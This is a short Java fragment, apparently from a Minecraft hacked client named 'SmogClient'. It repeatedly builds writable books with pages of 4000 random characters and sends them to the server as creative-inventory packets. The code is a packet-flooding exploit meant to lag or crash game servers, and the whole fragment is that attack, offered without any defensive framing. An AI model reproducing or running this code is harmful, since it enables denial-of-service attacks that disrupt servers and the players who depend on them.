char[] letters = new char[]{'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'r', 's', 't', 'u', 'v', 'w', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0'};

//There is a modes but ughhh do u really need a shit with extra:text?

for (int c = 0; c < packets; c++) {
    NBTTagCompound comp = new NBTTagCompound();
    NBTTagList list = new NBTTagList();
    StringBuilder content = new StringBuilder();

    for (int j = 0; j < 4000; j++) content.append(letters[random.nextInt(letters.length - 1)]);

    list.appendTag(new NBTTagString(content.toString()));

    comp.setString("author", "SmogClient");
    comp.setString("title", "SmogBot");
    comp.setByte("resolved", (byte) 1);
    comp.setTag("pages", list);

    ItemStack stack = new ItemStack(Items.writable_book);
    stack.setTagCompound(comp);
    
    mc.getNetHandler().getNetworkManager().sendPacket(new C10PacketCreativeInventoryAction(-1, stack));
}